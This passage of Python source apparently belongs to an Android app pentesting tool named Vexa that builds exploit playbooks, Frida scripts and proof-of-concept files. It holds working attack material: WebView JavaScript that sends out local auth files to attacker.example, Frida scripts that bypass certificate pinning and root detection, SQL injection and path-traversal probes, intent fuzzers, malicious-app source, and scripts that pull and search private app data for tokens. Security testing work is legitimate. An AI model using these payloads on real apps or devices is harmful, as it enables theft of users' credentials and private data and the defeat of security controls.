    crash = await adb_logcat_dump(package, serial, lines=80)
    return {
        "ok": r["ok"], "command": r["cmd"],
        "stdout": r["stdout"], "stderr": r["stderr"],
        "logcat": crash["stdout"][-4000:] if crash["stdout"] else "",
    }


async def test_content_provider(authority: str, serial: Optional[str] = None) -> dict:
    """Try common provider attacks: enumeration, SQLi, path traversal."""
    results = []
    probes = [
        ("baseline query",     ["shell", "content", "query", "--uri", f"content://{authority}/"]),
        ("query with SQLi",    ["shell", "content", "query", "--uri", f"content://{authority}/", "--where", "1=1"]),
        ("query union select", ["shell", "content", "query", "--uri", f"content://{authority}/", "--where", "1=1) UNION SELECT 1--"]),
        ("path traversal",     ["shell", "content", "read", "--uri", f"content://{authority}/../../../../etc/hosts"]),
    ]
    for label, args in probes:
        r = await adb_run(args, serial=serial, timeout=15)
        leaked = bool(r["stdout"]) and not r["stdout"].startswith("No result")
        results.append({
            "test": label, "command": r["cmd"], "stdout": r["stdout"][:2000],
            "stderr": r["stderr"][:500], "interesting": leaked,
        })
    return {"authority": authority, "probes": results}


async def test_deeplink(uri: str, serial: Optional[str] = None) -> dict:
    """Fire a deep link via VIEW intent."""
    await adb_logcat_clear(serial)
    safe_uri = uri.replace("*", "test").replace(".*", "test")
    r = await adb_run(["shell", "am", "start", "-W", "-a", "android.intent.action.VIEW",
                       "-d", safe_uri], serial=serial, timeout=15)
    crash = await adb_logcat_dump("", serial, lines=80)
    return {
        "ok": r["ok"], "uri": safe_uri, "command": r["cmd"],
        "stdout": r["stdout"], "stderr": r["stderr"],
        "logcat": crash["stdout"][-4000:] if crash["stdout"] else "",
    }


async def pull_app_data(package: str, serial: Optional[str] = None) -> dict:
    """Use run-as (works on debuggable apps) to pull /data/data/<pkg>/."""
    out_dir = PULLED_DIR / f"{package}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    out_dir.mkdir(parents=True, exist_ok=True)

    # First check if run-as works (i.e. app is debuggable)
    r = await adb_run(["shell", f"run-as", package, "ls", "-la", f"/data/data/{package}/"],
                      serial=serial, timeout=15)
    if not r["ok"] or "is not debuggable" in r["stderr"]:
        return {"ok": False, "error": "App is not debuggable on this device. Cannot use run-as.",
                "command": r["cmd"], "stderr": r["stderr"]}

    # Tar up the directory
    tar_cmd = f"run-as {package} sh -c 'cd /data/data/{package} && tar c .'"
    r = await adb_run(["exec-out"] + tar_cmd.split(), serial=serial, timeout=120)
    if not r["ok"]:
        return {"ok": False, "error": "tar failed", "stderr": r["stderr"]}

    tar_file = out_dir / f"{package}.tar"
    tar_file.write_bytes(r["stdout"].encode("latin-1"))
    return {
        "ok": True, "package": package,
        "saved_to": str(tar_file),
        "size_bytes": tar_file.stat().st_size,
        "listing": r["stdout"][:2000],
    }


async def run_full_dynamic_test(report: dict, serial: Optional[str] = None) -> dict:
    """
    Drive the device to test EVERY finding that can be tested dynamically.
    Returns a structured report of what was tried and what happened.
    """
    pkg = report.get("metadata", {}).get("package")
    if not pkg:
        return {"error": "No package name in report"}

    extras = report.get("extras", {})
    finding_ids = {f["id"] for f in report.get("findings", [])}
    out = {"package": pkg, "serial": serial, "tests": []}

    # 1. Exported activities
    activities = [c for c in extras.get("exported_components", []) if c["tag"] in ("activity", "activity-alias")]
    for c in activities[:10]:
        log.info("  dyn: launching %s/%s", pkg, c["name"])
        r = await test_exported_activity(pkg, c["name"], serial)
        out["tests"].append({
            "type": "exported-activity",
            "target": c["name"],
            "result": r,
            "verdict": "CRASHED ✗" if r.get("crashed") else ("LAUNCHED ✓" if r["ok"] else "FAILED"),
        })

    # 2. Exported services
    services = [c for c in extras.get("exported_components", []) if c["tag"] == "service"]
    for c in services[:10]:
        r = await test_exported_service(pkg, c["name"], serial)
        out["tests"].append({"type": "exported-service", "target": c["name"], "result": r,
                             "verdict": "STARTED ✓" if r["ok"] else "FAILED"})

    # 3. Exported receivers
    receivers = [c for c in extras.get("exported_components", []) if c["tag"] == "receiver"]
    for c in receivers[:10]:
        r = await test_exported_receiver(pkg, c["name"], serial)
        out["tests"].append({"type": "exported-receiver", "target": c["name"], "result": r,
                             "verdict": "DELIVERED ✓" if r["ok"] else "FAILED"})

    # 4. Content providers
    providers = [c for c in extras.get("exported_components", []) if c["tag"] == "provider"]
    for c in providers[:10]:
        auth = c.get("authorities") or c["name"]
        if auth and ";" in auth:
            auth = auth.split(";")[0]
        r = await test_content_provider(auth, serial)
        any_leak = any(p["interesting"] for p in r["probes"])
        out["tests"].append({"type": "content-provider", "target": auth, "result": r,
                             "verdict": "DATA LEAKED ✗" if any_leak else "no leak"})

    # 5. Deep links
    deeplinks = extras.get("deeplinks", [])
    seen_uris = set()
    for d in deeplinks[:15]:
        uri = d.get("uri")
        if not uri or uri in seen_uris:
            continue
        seen_uris.add(uri)
        r = await test_deeplink(uri, serial)
        out["tests"].append({"type": "deeplink", "target": uri, "result": r,
                             "verdict": "TRIGGERED ✓" if r["ok"] else "FAILED"})

    # 6. Pull data (only if debuggable)
    if "app-debuggable" in finding_ids:
        r = await pull_app_data(pkg, serial)
        out["tests"].append({"type": "pull-data", "target": pkg, "result": r,
                             "verdict": "EXTRACTED ✓" if r.get("ok") else "n/a"})

    out["summary"] = {
        "total": len(out["tests"]),
        "crashes": sum(1 for t in out["tests"] if "CRASHED" in t.get("verdict", "")),
        "leaks": sum(1 for t in out["tests"] if "LEAKED" in t.get("verdict", "")),
        "successes": sum(1 for t in out["tests"] if "✓" in t.get("verdict", "")),
    }
    return out


# =============================================================================
# Exploit Advisor (rule-based, fully offline — no LLM)
# =============================================================================
def build_exploit_playbook(report: dict) -> list:
    """Generate concrete attacker commands from findings + extras."""
    if report.get("platform") == "iOS":
        return build_ios_exploit_playbook(report)
    pkg = report.get("metadata", {}).get("package") or "<package>"
    main_activity = report.get("metadata", {}).get("main_activity") or ".MainActivity"
    findings = report.get("findings", [])
    extras = report.get("extras", {})
    ids = {f["id"] for f in findings}
    blocks = []

    if "app-debuggable" in ids:
        blocks.append({
            "id": "debuggable", "title": "Attach debugger / extract data (debuggable=true)",
            "severity": "high",
            "why": "android:debuggable=\"true\" lets ANY user with USB access run code in the app's UID. Game-over for client-side controls.",
            "steps": [
                ("Pull the app's private storage (no root needed)",
                 f"adb shell run-as {pkg} ls -la /data/data/{pkg}/\n"
                 f"adb shell run-as {pkg} cat /data/data/{pkg}/shared_prefs/*.xml\n"
                 f"adb exec-out run-as {pkg} sh -c 'cd /data/data/{pkg} && tar c .' > app_data.tar"),
                ("Attach Java debugger and inspect runtime state",
                 f"adb shell am start -D -n {pkg}/{main_activity}\n"
                 f"adb forward tcp:8700 jdwp:$(adb shell pidof {pkg})\n"
                 "jdb -attach localhost:8700"),
                ("Inside jdb: bypass auth checks",
                 "stop in com.example.MyAuth.checkPassword\n"
                 "set $0.authenticated = true\n"
                 "cont"),
            ],
        })

    if "allow-backup" in ids:
        blocks.append({
            "id": "allowbackup", "title": "Extract private app data via adb backup",
            "severity": "medium",
            "why": "allowBackup defaults to true. Anyone with USB debugging can take a full backup of the app's private folder.",
            "steps": [
                ("Take a backup (tap 'Back up my data' on device prompt)",
                 f"adb backup -f {pkg}.ab -noapk {pkg}"),
                ("Convert .ab → tar (using android-backup-extractor)",
                 f"java -jar abe.jar unpack {pkg}.ab {pkg}.tar\n"
                 f"tar xvf {pkg}.tar"),
                ("Search the extracted apps/<pkg>/ for tokens, session IDs, PII",
                 f"grep -ri 'token\\|password\\|secret\\|api_key' apps/{pkg}/"),
            ],
        })

    exported = extras.get("exported_components", [])
    activities = [c for c in exported if c["tag"] in ("activity", "activity-alias")]
    services = [c for c in exported if c["tag"] == "service"]
    receivers = [c for c in exported if c["tag"] == "receiver"]
    providers = [c for c in exported if c["tag"] == "provider"]

    if activities:
        sample = activities[:5]
        cmd_block = "\n".join(f"adb shell am start -n {pkg}/{a['name']}" for a in sample)
        fuzz = (f"adb shell am start -n {pkg}/{sample[0]['name']} \\\n"
                f"  --es payload \"<script>alert(1)</script>\" \\\n"
                f"  --ei id 2147483647 \\\n"
                f"  --ez admin true \\\n"
                f"  --ei flags 268435456")
        blocks.append({
            "id": "exported-activities",
            "title": f"Reach exported activities ({len(activities)} found)",
            "severity": "medium",
            "why": "Exported activities can be launched by any other app on the device, bypassing intended navigation flow and authentication screens.",
            "steps": [
                ("Launch each exported activity directly", cmd_block),
                ("Fuzz Intent extras (string + integer + boolean)", fuzz),
                ("Check task affinity hijack",
                 f"<!-- Add this Activity to your malicious app's manifest -->\n"
                 f'<activity android:name=".HijackActivity"\n'
                 f'  android:taskAffinity="{pkg}"\n'
                 f'  android:allowTaskReparenting="true" />'),
            ],
        })

    if services:
        cmd_block = "\n".join(f"adb shell am startservice -n {pkg}/{s['name']}" for s in services[:5])
        blocks.append({
            "id": "exported-services",
            "title": f"Trigger exported services ({len(services)} found)",
            "severity": "medium",
            "why": "Exported services accept Intents from any app. They often process commands without re-authenticating the caller.",
            "steps": [
                ("Start each exported service", cmd_block),
                ("Send extras to find unhandled actions",
                 f"adb shell am startservice -n {pkg}/{services[0]['name']} \\\n"
                 f"  --es action admin --es payload AAAA --ei userid 0"),
                ("Check return value via setResult / Messenger",
                 "# Watch logcat for IPC errors / crashes:\n"
                 f"adb logcat -c && adb logcat | grep -i {pkg}"),
            ],
        })

    if receivers:
        cmd_block = "\n".join(f"adb shell am broadcast -n {pkg}/{r['name']} --ez debug true"
                             for r in receivers[:5])
        blocks.append({
            "id": "exported-receivers",
            "title": f"Broadcast to exported receivers ({len(receivers)} found)",
            "severity": "medium",
            "why": "Receivers commonly perform privileged actions (logout, sync, refresh tokens). Look for ones that change state without checking the sender.",
            "steps": [
                ("Direct broadcast to each receiver", cmd_block),
                ("Spoof common system actions",
                 f"adb shell am broadcast -a android.intent.action.BOOT_COMPLETED\n"
                 f"adb shell am broadcast -a android.intent.action.USER_PRESENT\n"
                 f"adb shell am broadcast -a android.net.conn.CONNECTIVITY_CHANGE"),
            ],
        })

    if providers:
        steps = []
        for p in providers[:5]:
            auth = (p.get("authorities") or p["name"]).split(";")[0]
            steps.append((f"Probe {auth}",
                         f"# 1. Enumerate URIs\n"
                         f"adb shell content query --uri content://{auth}/\n"
                         f"\n# 2. SQL injection in WHERE clause\n"
                         f"adb shell content query --uri content://{auth}/ --where \"1=1\"\n"
                         f"adb shell content query --uri content://{auth}/ --where \"1) UNION SELECT name FROM sqlite_master--\"\n"
                         f"\n# 3. Path traversal in openFile()\n"
                         f"adb shell content read --uri content://{auth}/../../../../etc/hosts\n"
                         f"adb shell content read --uri content://{auth}/../databases/users.db"))
        blocks.append({
            "id": "content-providers",
            "title": f"Probe exported content providers ({len(providers)} found)",
            "severity": "high",
            "why": "Content providers without permissions are reachable from any app. Path traversal in openFile() and SQL injection in query() are the two go-to attacks.",
            "steps": steps,
        })

    deeplinks = extras.get("deeplinks", [])
    if deeplinks:
        unique = []
        seen = set()
        for d in deeplinks:
            uri = d.get("uri")
            if uri and uri not in seen:
                seen.add(uri)
                unique.append(d)
        sample = unique[:5]
        adb_cmds = "\n".join(
            f"adb shell am start -W -a android.intent.action.VIEW -d \"{d['uri'].replace('*', 'test')}\""
            for d in sample)
        smuggle = "\n".join(
            f"adb shell am start -W -a android.intent.action.VIEW \\\n"
            f"  -d \"{d['uri'].replace('*', 'x')}?next=https://attacker.example/xss.html\""
            for d in sample[:3])
        web_poc = (
            "<!DOCTYPE html>\n<html><body>\n"
            "<h2>Deep link tester</h2>\n<ul>\n"
            + "\n".join(f'  <li><a href="{d["uri"].replace("*", "x")}">{html.escape(d["uri"])}</a></li>'
                        for d in sample)
            + "\n</ul>\n</body></html>"
        )
        blocks.append({
            "id": "deeplinks",
            "title": f"Test deep link entry points ({len(unique)} unique URIs)",
            "severity": "high" if any(not d.get("auto_verify") for d in deeplinks) else "medium",
            "why": "Deep links are the #1 entry point for mobile pre-auth attacks: open redirect, WebView URL injection, parameter smuggling into native code.",
            "steps": [
                ("Trigger each deep link via adb", adb_cmds),
                ("Smuggle attacker URLs (test for WebView injection)", smuggle),
                ("Web-based PoC (host this HTML, click in device browser)", web_poc),
            ],
        })

    if any(i.startswith("secret-") for i in ids):
        secrets = [f for f in findings if f["id"].startswith("secret-")]
        blocks.append({
            "id": "secrets",
            "title": f"Validate hardcoded secrets ({len(secrets)} found)",
            "severity": "critical",
            "why": "Embedded secrets give attackers direct access to backend services. Validate each one is live, then report for rotation.",
            "steps": [
                ("AWS keys — verify with STS",
                 "# CLI:\nAWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity\n"
                 "# If valid, the response includes Account, UserId, Arn"),
                ("Google API key — try Maps API",
                 "curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIza...'"),
                ("Stripe key — check account",
                 "curl https://api.stripe.com/v1/charges -u sk_live_...:"),
                ("JWT — decode without verifying",
                 "echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null | jq ."),
            ],
        })

    if "trustmanager-bypass" in ids or "nsc-user-cas" in ids or "nsc-cleartext" in ids:
        blocks.append({
            "id": "mitm",
            "title": "MITM the app (cert validation weakness detected)",
            "severity": "critical" if "trustmanager-bypass" in ids else "medium",
            "why": "The app does not properly validate TLS certificates. You can intercept its traffic with Burp/mitmproxy and modify requests/responses.",
            "steps": [
                ("Set up Burp Suite as a proxy and trust its CA on device",
                 "# Phone WiFi settings → Modify network → Proxy: <your IP>:8080\n"
                 "# Visit http://burp on device → download cacert.der → install as user CA"),
                ("Force traffic through proxy via adb",
                 "adb shell settings put global http_proxy <your-ip>:8080\n"
                 "# To unset:  adb shell settings put global http_proxy :0"),
                ("If pinning blocks Burp, use Frida to bypass",
                 "# See the 'Frida' tab — Vexa can generate the script for this app."),
            ],
        })

    if any(i in ids for i in ("javascript-enabled", "js-interface-bridge",
                              "webview-file-from-file", "webview-universal-from-file")):
        blocks.append({
            "id": "webview",
            "title": "Exploit WebView misconfiguration",
            "severity": "high",
            "why": "WebView with JS enabled + addJavascriptInterface = RCE if you can control the loaded URL. file:// access expands the impact to local file reads.",
            "steps": [
                ("Find a deep link that controls the WebView URL",
                 "# Test each deep link with ?url=https://attacker.example/exploit.html\n"
                 "# If the WebView loads it, you have HTML injection."),
                ("Craft the JS payload",
                 "<script>\n"
                 "// If addJavascriptInterface bridge name is 'AndroidBridge':\n"
                 "if (typeof AndroidBridge !== 'undefined') {\n"
                 "  fetch('https://attacker.example/log?d=' +\n"
                 "        encodeURIComponent(JSON.stringify(\n"
                 "          Object.getOwnPropertyNames(AndroidBridge))));\n"
                 "}\n"
                 "</script>"),
                ("If file:// access is enabled, exfil local files",
                 "<script>\n"
                 "fetch('file:///data/data/" + pkg + "/shared_prefs/auth.xml')\n"
                 "  .then(r => r.text()).then(t =>\n"
                 "    fetch('https://attacker.example/' + btoa(t)));\n"
                 "</script>"),
            ],
        })

    # Always-applicable generic blocks
    blocks.append({
        "id": "tooling",
        "title": "General offline tooling",
        "severity": "info",
        "why": "Reference commands you'll use across most engagements.",
        "steps": [
            ("Decompile to readable Java",
             "# jadx (https://github.com/skylot/jadx)\n"
             "jadx -d output/ <app>.apk\n\n"
             "# apktool (resources + smali)\n"
             "apktool d <app>.apk -o decoded/"),
            ("Static taint search in decompiled code",
             "grep -rn 'getIntent\\|getStringExtra\\|getData()' output/sources/ | head -50\n"
             "grep -rn 'loadUrl\\|exec\\|Runtime.getRuntime' output/sources/ | head -50"),
            ("Frida quick-start",
             "# Install frida-server on device (matching architecture):\n"
             "adb push frida-server /data/local/tmp/\n"
             "adb shell 'chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &'\n"
             "frida -U -f " + pkg + " -l hook.js --no-pause"),
        ],
    })
    return blocks


# =============================================================================
# Frida script generators
# =============================================================================
def frida_ssl_bypass(package: str) -> str:
    return f"""// SSL pinning bypass for {package}
// Usage:  frida -U -f {package} -l ssl_bypass.js --no-pause

Java.perform(function() {{
    console.log("[+] Vexa SSL bypass loaded for {package}");

    // 1. Default Java TrustManager bypass
    try {{
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustManager = Java.registerClass({{
            name: 'com.vexa.TrustManager',
            implements: [X509TrustManager],
            methods: {{
                checkClientTrusted: function(chain, authType) {{}},
                checkServerTrusted: function(chain, authType) {{}},
                getAcceptedIssuers: function() {{ return []; }}
            }}
        }});
        var TrustManagers = [TrustManager.$new()];
        var SSLContext_init = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;',
            'java.security.SecureRandom');
        SSLContext_init.implementation = function(km, tm, sr) {{
            console.log("[+] SSLContext.init() bypassed");
            SSLContext_init.call(this, km, TrustManagers, sr);
        }};
    }} catch (e) {{ console.log("[-] X509TrustManager hook failed: " + e); }}

    // 2. OkHttp 3.x CertificatePinner
    try {{
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String',
            'java.util.List').implementation = function(host, certs) {{
            console.log("[+] OkHttp CertificatePinner.check() bypassed for " + host);
        }};
    }} catch (e) {{}}

    // 3. OkHttp 3.x CertificatePinner (chain variant)
    try {{
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check$okhttp.overload('java.lang.String',
            'kotlin.jvm.functions.Function0').implementation = function(host, fn) {{
            console.log("[+] OkHttp3 check$okhttp bypassed for " + host);
        }};
    }} catch (e) {{}}

    // 4. WebViewClient.onReceivedSslError
    try {{
        var WVC = Java.use('android.webkit.WebViewClient');
        WVC.onReceivedSslError.implementation = function(view, handler, err) {{
            console.log("[+] WebViewClient.onReceivedSslError → proceed()");
            handler.proceed();
        }};
    }} catch (e) {{}}

    // 5. Conscrypt
    try {{
        var array_list = Java.use("java.util.ArrayList");
        var ApiClient = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        ApiClient.checkTrustedRecursive.implementation = function(a,b,c,d,e,f) {{
            console.log("[+] Conscrypt TrustManagerImpl bypassed");
            return array_list.$new();
        }};
    }} catch (e) {{}}

    console.log("[+] All SSL hooks installed");
}});
"""


def frida_root_bypass(package: str) -> str:
    return f"""// Root detection bypass for {package}
// Usage:  frida -U -f {package} -l root_bypass.js --no-pause

Java.perform(function() {{
    console.log("[+] Vexa root bypass loaded for {package}");

    // 1. RootBeer common methods
    try {{
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        for (var m of ['isRooted', 'isRootedWithoutBusyBoxCheck',
                       'detectRootManagementApps', 'detectPotentiallyDangerousApps',
                       'checkForBinary', 'checkForDangerousProps',
                       'checkForRWPaths', 'checkForRootNative',
                       'detectTestKeys', 'checkSuExists']) {{
            try {{
                RootBeer[m].implementation = function() {{
                    console.log("[+] RootBeer." + m + "() → false");
                    return false;
                }};
            }} catch (e) {{}}
        }}
    }} catch (e) {{}}

    // 2. File.exists() filter for known root paths
    var rootFiles = ["su", "magisk", "supersu", "busybox", "xposed", "frida"];
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {{
        var name = this.getAbsolutePath();
        for (var i = 0; i < rootFiles.length; i++) {{
            if (name.toLowerCase().indexOf(rootFiles[i]) !== -1) {{
                console.log("[+] File.exists(" + name + ") → false");
                return false;
            }}
        }}
        return this.exists.call(this);
    }};

    // 3. Runtime.exec("su") and "which su"
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {{
        if (cmd.indexOf("su") !== -1 || cmd.indexOf("which") !== -1) {{
            console.log("[+] Runtime.exec(" + cmd + ") blocked");
            cmd = "echo";
        }}
        return this.exec.overload('java.lang.String').call(this, cmd);
    }};

    // 4. Build.TAGS check (test-keys)
    var Build = Java.use('android.os.Build');
    Build.TAGS.value = "release-keys";

    console.log("[+] Root detection hooks installed");
}});
"""


def frida_universal_dumper(package: str) -> str:
    return f"""// Universal traffic / crypto / IPC dumper for {package}
// Usage:  frida -U -f {package} -l dumper.js --no-pause

Java.perform(function() {{
    console.log("[+] Vexa universal dumper loaded for {package}");

    // ---- HTTP traffic (OkHttp) ----
    try {{
        var Request = Java.use('okhttp3.Request');
        Request.toString.implementation = function() {{
            var s = this.toString.call(this);
            console.log("[HTTP] " + s);
            return s;
        }};
    }} catch (e) {{}}

    // ---- Cipher operations ----
    try {{
        var Cipher = Java.use('javax.crypto.Cipher');
        Cipher.doFinal.overload('[B').implementation = function(data) {{
            var algo = this.getAlgorithm();
            console.log("[CIPHER] " + algo + "  in=" + bytesToHex(data));
            var out = this.doFinal.overload('[B').call(this, data);
            console.log("[CIPHER] " + algo + " out=" + bytesToHex(out));
            return out;
        }};
    }} catch (e) {{}}

    // ---- SharedPreferences writes ----
    try {{
        var Editor = Java.use('android.content.SharedPreferences$Editor');
        Editor.putString.implementation = function(k, v) {{
            console.log("[PREFS] putString(" + k + ", " + v + ")");
            return this.putString.call(this, k, v);
        }};
    }} catch (e) {{}}

    // ---- Intent extras read ----
    try {{
        var Intent = Java.use('android.content.Intent');
        Intent.getStringExtra.implementation = function(k) {{
            var v = this.getStringExtra.call(this, k);
            console.log("[INTENT] getStringExtra(" + k + ") = " + v);
            return v;
        }};
    }} catch (e) {{}}

    function bytesToHex(b) {{
        if (!b) return "<null>";
        var hex = "0123456789abcdef";
        var out = "";
        for (var i = 0; i < Math.min(b.length, 64); i++) {{
            var v = b[i] & 0xff;
            out += hex[v >> 4] + hex[v & 15];
        }}
        if (b.length > 64) out += "...(" + b.length + " bytes)";
        return out;
    }}

    console.log("[+] All hooks installed. Use the app to see traffic.");
}});
"""


# =============================================================================
# PoC Generator Engine
# Generates real, downloadable exploit artifacts per finding.
# Each PoC = list of files (HTML, JS, sh, py, java) that pentester can run.
# =============================================================================
POC_DIR = DATA_DIR / "pocs"
POC_DIR.mkdir(parents=True, exist_ok=True)


@dataclass
class PoCArtifact:
    filename: str
    content: str
    language: str  # html | js | py | sh | java | xml | txt | bat


@dataclass
class PoC:
    id: str                           # unique poc id, e.g. "poc-deeplink-1"
    finding_id: str                   # which finding this PoC targets
    title: str
    severity: str
    why: str                          # one-paragraph explanation
    impact: str                       # what success looks like
    artifacts: list                   # list[PoCArtifact]
    automated_cmd: Optional[list] = None    # adb command list to verify (or None)
    success_indicator: Optional[str] = None  # substring in output that means "exploited"
    confidence: str = "static"        # static | verified | failed | needs-device
    last_run: Optional[dict] = None   # populated after dynamic verification

    def to_dict(self):
        d = asdict(self)
        return d


# ---------- Per-vulnerability PoC builders ----------

def _safe_pkg(pkg: str) -> str:
    return re.sub(r"[^A-Za-z0-9_.]", "_", pkg) or "app"


def poc_debuggable(pkg: str, main_activity: str) -> PoC:
    pull_sh = f"""#!/bin/bash
# Vexa PoC: extract private app data via run-as (works because debuggable=true)
# Target: {pkg}
set -e
PKG="{pkg}"
OUT="${{PKG}}_data_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

echo "[*] Listing /data/data/$PKG/"
adb shell run-as "$PKG" ls -la "/data/data/$PKG/"

echo "[*] Tarring private storage to local disk"
adb exec-out run-as "$PKG" sh -c "cd /data/data/$PKG && tar c ." > "$OUT/data.tar"

echo "[*] Extracting"
tar xf "$OUT/data.tar" -C "$OUT"

echo "[*] Searching for credentials, tokens, PII"
grep -rIn -E '(token|secret|api[_-]?key|password|bearer|session|cookie|jwt)' "$OUT" || true

echo "[+] Done. Data extracted to $OUT/"
"""
    pull_bat = f"""@echo off
REM Vexa PoC: extract private app data (debuggable=true)
set PKG={pkg}
set OUT=%PKG%_data
mkdir %OUT% 2>nul
adb shell run-as %PKG% ls -la /data/data/%PKG%/
adb exec-out run-as %PKG% sh -c "cd /data/data/%PKG% && tar c ." > %OUT%\\data.tar
echo [+] Extracted to %OUT%\\data.tar
"""
    jdb_sh = f"""#!/bin/bash
# Vexa PoC: attach JDB debugger to bypass client-side checks
PKG="{pkg}"
adb shell am start -D -n "$PKG/{main_activity}"
sleep 2
PID=$(adb shell pidof "$PKG" | tr -d '\\r')
adb forward tcp:8700 jdwp:$PID
echo "[+] JDB ready. Now run:  jdb -attach localhost:8700"
echo "    Inside jdb you can:"
echo "    - stop in <fully.qualified.Class.method>"
echo "    - print this.someField"
echo "    - set this.authenticated = true"
"""
    return PoC(
        id="poc-debuggable",
        finding_id="app-debuggable",
        title="Extract private storage + attach debugger",
        severity="high",
        why="android:debuggable=\"true\" lets ANY user with USB access run code in the app's UID. No root required.",
        impact="Full read of /data/data/<pkg>/ — SharedPreferences, SQLite DBs, cached tokens. Live debugging to bypass auth.",
        artifacts=[
            PoCArtifact("pull_app_data.sh", pull_sh, "sh"),
            PoCArtifact("pull_app_data.bat", pull_bat, "bat"),
            PoCArtifact("jdb_attach.sh", jdb_sh, "sh"),
        ],
        automated_cmd=["shell", "run-as", pkg, "ls", "-la", f"/data/data/{pkg}/"],
        success_indicator="cache",  # if listing succeeds, run-as worked
    )


def poc_allowbackup(pkg: str) -> PoC:
    sh = f"""#!/bin/bash
# Vexa PoC: extract data via adb backup (allowBackup=true)
set -e
PKG="{pkg}"

echo "[*] Triggering backup. TAP 'Back up my data' on the device when prompted."
adb backup -f "$PKG.ab" -noapk "$PKG"

if [ ! -s "$PKG.ab" ] || [ $(stat -c%s "$PKG.ab" 2>/dev/null || stat -f%z "$PKG.ab") -lt 100 ]; then
    echo "[-] Backup file is empty — user may have declined the prompt."
    exit 1
fi

echo "[*] Converting .ab → .tar (needs abe.jar from android-backup-extractor)"
echo "    Download: https://github.com/nelenkov/android-backup-extractor/releases"
if [ -f abe.jar ]; then
    java -jar abe.jar unpack "$PKG.ab" "$PKG.tar"
    mkdir -p extracted && tar xf "$PKG.tar" -C extracted
    echo "[*] Searching for sensitive content"
    grep -rIn -E '(token|secret|api[_-]?key|password|bearer)' extracted/ || true
else
    echo "[!] Place abe.jar in current directory and re-run, or run manually:"
    echo "    java -jar abe.jar unpack $PKG.ab $PKG.tar"
fi
"""
    return PoC(
        id="poc-allowbackup",
        finding_id="allow-backup",
        title="Extract app data via adb backup",
        severity="medium",
        why="allowBackup=true permits any user with USB debugging to take a full backup of the app's private folder.",
        impact="Reveals SharedPreferences (often containing tokens), SQLite databases, cached files.",
        artifacts=[PoCArtifact("backup_extract.sh", sh, "sh")],
        automated_cmd=None,  # requires user interaction on device
        confidence="needs-device",
    )


def poc_exported_activities(pkg: str, activities: list) -> Optional[PoC]:
    if not activities:
        return None
    safe_pkg = _safe_pkg(pkg)
    sample = activities[:6]

    # 1. Direct adb fuzzer
    sh = f"""#!/bin/bash
# Vexa PoC: Trigger every exported activity in {pkg} with payload variations
set -e
PKG="{pkg}"

declare -a TARGETS=(
{chr(10).join(f'  "{a["name"]}"' for a in sample)}
)

declare -a PAYLOADS_S=(
  "<script>alert(1)</script>"
  "../../../etc/passwd"
  "javascript:alert(1)"
  "https://attacker.example/"
  "file:///data/data/$PKG/databases/"
  "' OR '1'='1"
  "AAAA$(printf 'A%.0s' {{1..2000}})"
)

declare -a PAYLOADS_I=("0" "-1" "2147483647" "-2147483648")

for ACT in "${{TARGETS[@]}}"; do
    echo "==== $PKG/$ACT ===="
    echo "[*] Plain launch"
    adb shell am start -W -n "$PKG/$ACT" 2>&1 | tail -3

    for P in "${{PAYLOADS_S[@]}}"; do
        echo "[*] String extra: $P" | head -c 80
        adb shell am start -W -n "$PKG/$ACT" --es payload "$P" --es url "$P" --es data "$P" 2>&1 | grep -E "Status|Error" | head -2
    done

    for P in "${{PAYLOADS_I[@]}}"; do
        adb shell am start -W -n "$PKG/$ACT" --ei id $P --ei userid $P --ei amount $P 2>&1 | grep -E "Status|Error" | head -1
    done

    echo "[*] Boolean admin=true"
    adb shell am start -W -n "$PKG/$ACT" --ez admin true --ez is_premium true --ez bypass_auth true 2>&1 | grep -E "Status|Error" | head -1

    # Capture any crash from the last 50 logcat lines
    CRASH=$(adb shell "logcat -d -t 50 | grep -E 'FATAL|AndroidRuntime'" 2>/dev/null | head -5)
    if [ -n "$CRASH" ]; then
        echo "[!] CRASH detected:"
        echo "$CRASH"
    fi
    adb shell logcat -c
done

echo "[+] Activity fuzzing complete"
"""

    # 2. Malicious attacker-app source (Java) that launches first activity
    java_attacker = f"""// Vexa PoC: malicious app that launches an exported activity in {pkg}
// Drop this into a fresh Android Studio project.
package com.vexa.attacker;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle b) {{
        super.onCreate(b);
        Intent i = new Intent();
        i.setComponent(new ComponentName(
            "{pkg}", "{sample[0]['name']}"
        ));
        // Crafted extras — vary these to fuzz
        i.putExtra("admin", true);
        i.putExtra("user_id", -1);
        i.putExtra("payload", "<script>alert(1)</script>");
        i.putExtra("redirect_url", "https://attacker.example/xss.html");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        finish();
    }}
}}
"""
    return PoC(
        id="poc-exported-activities",
        finding_id="exported-activity",
        title=f"Fuzz {len(activities)} exported activities",
        severity="medium",
        why="Exported activities are reachable by any other app on the device. Bypasses in-app navigation guards and auth screens.",
        impact="Reach internal screens directly. Crash the app via malformed extras. Trigger sensitive flows without authentication.",
        artifacts=[
            PoCArtifact("fuzz_activities.sh", sh, "sh"),
            PoCArtifact("AttackerApp_MainActivity.java", java_attacker, "java"),
        ],
        automated_cmd=["shell", "am", "start", "-W", "-n", f"{pkg}/{sample[0]['name']}"],
        success_indicator="Status: ok",
    )


def poc_exported_services(pkg: str, services: list) -> Optional[PoC]:
    if not services:
        return None
    sh = f"""#!/bin/bash
# Vexa PoC: Trigger exported services in {pkg}
PKG="{pkg}"

declare -a SVC=(
